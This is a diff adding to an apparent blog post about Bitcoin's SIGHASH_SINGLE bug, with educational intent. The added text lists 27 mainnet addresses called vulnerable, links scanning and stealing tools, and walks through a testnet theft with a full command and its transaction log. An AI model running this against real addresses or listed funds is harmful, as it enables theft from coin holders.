@@ -212,4 +212,94 @@ To prevent users from accidentally triggering this bug, thereby publishing a sig
 Taproot addresses, introduced in [BIP-341](https://github.com/bitcoin/bips/blob/master/bip-0341.mediawiki) as part of the taproot upgrade, can't create signature with `SIGHASH_SINGLE` such and without a matching output as this will invalidate such transactions.
 
 ## Some Tools
-I've written a tool called `bitcoin-scan-sighash` which can connect to a local instance of a bitcoin-core node and scan the blockchain for such instances, you can check the repo [here](https://github.com/MatanHamilis/bitcoin-sighash-scan)
+I've written a tool called `bitcoin-scan-sighash` which can connect to a local instance of a bitcoin-core node and scan the blockchain for such instances, you can check the repo [here](https://github.com/ZenGo-X/bitcoin-sighash-scan).
+Using this tool I have compiled a list of numerous addresses who are vulnerable to the bug.
+
+```
+112jWgS2NYh6bwn2BWzNcPgELXxLxftx31
+112RCi89FwLb64LePtxCHB86jY4BBAhLiP
+1134V46popKAN2QLh1jDMCKPA6fjRnHTAP
+1135zjYCkCGJUnuVG7yZcSFuLofcM5g2T
+113VrEwZ7L77yFHD2yoKR8qZFr5Xuq8Khs
+114cLg5Gc3hkkWuMN5B55YVLzPxS49VMvc
+12S88cuMiUA7JdGsHTbKsXezUFzE2nNjFt
+15iwPhxErFDyQTJew81ok9hCbQNhyWuXq1
+19gVuEdDZ9XfmRSjLeAnywJ1zJoGig7qxq
+19MxhZPumMt9ntfszzCTPmWNQeh6j6QqP2
+1BqtnfhJS75AXKuDUAJ22XxU2QHNnENAcH
+1CeBmgAuBj8WVhwpEVqPPMyV36uHZRfevy
+1CgCMLupoVAnxFJwHTYTKrrRD3uoi3r1ag
+1cSSVdjkGRJJRdsFH3mfmDEQHGpyz8jka
+1Cy7gqTPMKDYpVS55MX7qemJBCE7tYbQY
+1EaVdukMkbwrmsndGgwoTw4jR8im9TGhZ7
+1EPPr3UQf6YMhEtejpjNUK6bVZ5HHLXjZ5
+1FFtUDpR2CYZDc9TxzNpbNP1U6cXQ9Lq5c
+1FjHqLzpeoMtaYa8MpbiYgbWihNGFocQno
+1FoELHXby4WYTVXxCcXf8nrnz3VvNUG2EG
+1fVuHc1ho7HhU9t8gk5xDDQzoiaEKShPs
+1Hh9Uur2QuCLBT7RQxPkSGrYPb6Vbd7iAs
+1JEM3niCozNRksJf3iYmBS99Yr1xUGc3KF
+1KxmSmcMTmPvU1qSLYpJLrqnSzBoQ53NXN
+1L5G9BRZ2o6HsKkMBJcUzg6nK1CgPjmgsz
+1L5vVsCYa5cC4xttt2WnbT6UtkjrxwyskV
+1YLtj6tygZh35AUKTqvxHedpydQbc1MaP
+```
+
+Notice that this tool also outputs the exact `txid` and `vout` in which the `scriptSig` contains a `SIGHASH_SINGLE` (or the `SIGHASH_SINGLE | SIGHASH_ANYONECANPAY` variant).
+
+So, it would be nice if we could put out knowledge to the test. 
+In theory if any of these addresses had a positive balance, we could have stolen their coins using our knowledge.
+Since they are emptied (are they?), we can try doing something else, sending a small amount of coins to such vulnerable address and then "steal" the coins sent there.
+
+In order to do so, I've written another tool called `bitcoin-steal-sighash` available [here](https://github.com/ZenGo-X/bitcoin-sighash-steal).
+
+Let's give an example of how we can use it.
+Let's say we have an address that is vulnerable to the `SIGHASH_SINGLE` bug, that means we have some `scriptSig` of some input within some transaction on which the owner of this address have signed "1".
+
+To save you the effort, I have created such a vulnerable address on the testnet of Bitcoin.
+The address is `mhHZmAp9ZAD2GuFqvg9ekQk9WwGX5iQGxt` and the vulnerable `scriptSig` is:
+```
+4730440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a032102773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70f
+```
+
+So feel free to use it!
+In fact, let's use it now.
+
+Now, before running the tool (on testnet) you have to run a testnet node, that means you'll have to modify your node's configuration so that it will connect to the testnet, typically all it takes is to add the `testnet=1` line inside your node's configuration file or run your node with the `-testnet` flag.
+This is done on purpose to make it a little bit harder for you to run this on mainnet so you won't accidentally lose your precious coins. *Please don't run this on mainnet unless you know what you're doing!*
+
+To use it we'll have to specify the following:
+1. attacker address (using `--attacker-address`), this is our address (since we're the attackers!), stolen funds will be sent to this address. Notice that to employ this attack you'll have to own some coins in this address (since we need some initial utxo to spend). You can use any Bitcoin-testnet faucet, I used [this one](https://testnet-faucet.mempool.co/).
+2. The properties of the UTXO owned by the victim which we want to steal, that is the `txid` (using the `--steal-txid` flag) and the `vout` (using the `--steal-vout` flag).
+3. Vulnerable script - This is a `scriptSig` which contains the signature on "1" signed by the victim.
+
+Using these inputs we can run our tool:
+
+```
+> bitcoin-steal-sighash \
+    --attacker-address mp4TunkzwEbpmRQfz6tRaFAcQYmBoFgQKP \
+    --steal-txid 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb \
+    --steal-vout 1 \
+    --vuln-script 4730440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a032102773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70f
+
+[00:00:00.000] (7fba1c3c57c0) INFO   Using .cookie auth with path: /home/matan/.bitcoin/testnet3/.cookie
+[00:00:00.000] (7fba1c3c57c0) INFO   Using url: http://127.0.0.1:18332
+[00:00:00.001] (7fba1c3c57c0) INFO   Spending utxo: txid: 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb, vout: 0
+[00:00:00.008] (7fba1c3c57c0) INFO   steal_tx: Transaction { version: 2, lock_time: 0, input: [TxIn { previous_output: OutPoint { txid: 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb, vout: 0 }, script_sig: Script(OP_PUSHBYTES_71 304402203a52f4e75e07f1745a99c52a6cab35efebf3b6748ddb29a580e5c6f09c8db0b10220418b2c9b752b7617fb3bb255842e5dc4baa8ff6595ca66b8a118e2a0091d125a03 OP_PUSHBYTES_33 02e9ebcfe1ada8a3ebf9c9978de06b8290a568e78c19411c261909890006b1273c), sequence: 4294967295, witness: [] }, TxIn { previous_output: OutPoint { txid: 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb, vout: 1 }, script_sig: Script(OP_PUSHBYTES_71 30440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a03 OP_PUSHBYTES_33 02773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70f), sequence: 4294967295, witness: [] }], output: [TxOut { value: 365921, script_pubkey: Script(OP_DUP OP_HASH160 OP_PUSHBYTES_20 5db69f9669402ac82b24302665d7a5e72e62fbfc OP_EQUALVERIFY OP_CHECKSIG) }] }
+[00:00:00.008] (7fba1c3c57c0) INFO   steal_tx raw: 0200000002dbaa32669feb164f80c94aaddc72ccf11d5fe43d9c86f9159ced22ecb8780941000000006a47304402203a52f4e75e07f1745a99c52a6cab35efebf3b6748ddb29a580e5c6f09c8db0b10220418b2c9b752b7617fb3bb255842e5dc4baa8ff6595ca66b8a118e2a0091d125a032102e9ebcfe1ada8a3ebf9c9978de06b8290a568e78c19411c261909890006b1273cffffffffdbaa32669feb164f80c94aaddc72ccf11d5fe43d9c86f9159ced22ecb8780941010000006a4730440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a032102773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70fffffffff0161950500000000001976a9145db69f9669402ac82b24302665d7a5e72e62fbfc88ac00000000
+[00:00:00.010] (7fba1c3c57c0) INFO   https://blockstream.info/testnet/tx/195f980f04e81444aa37aaa9bb6bdf40295776ba5fa36e96ed28da6f5b55dd7d?input:0&expand
+[00:00:00.010] (7fba1c3c57c0) INFO   https://blockstream.info/testnet/address/mp4TunkzwEbpmRQfz6tRaFAcQYmBoFgQKP
+[00:00:00.010] (7fba1c3c57c0) INFO   Finished, leaving!
+```
+
+You'll probably have to send some testnet coins to the vulnerable address first and then using the sent coins you can steal those back!
+When our tool finishes its execution (successfully) it writes the link to Blocksteam's explorer, you can check the links in the example to see how a successful execution looks like.
+
+## Ending Thoughts
+
+I hope you've learnt something new about Bitcoin and how the different parts of it come together. Try and imagining how difficult it is to design and maintain systems which rely on distributed consensus and how one tiny bug has remained with us for over 13 years.
+
+In one address on the mainnet I've also hidden a (very) small bounty that you can steal if you follow everything here correctly. 
+So go ahead and good luck!
+The winner is kindly requested to get in touch with me on [Twitter](https://twitter.com/MHamilis) or [Telegram](https://t.me/hamilis).
+If you have any questions feel free to ask on Twitter / Telegram too.
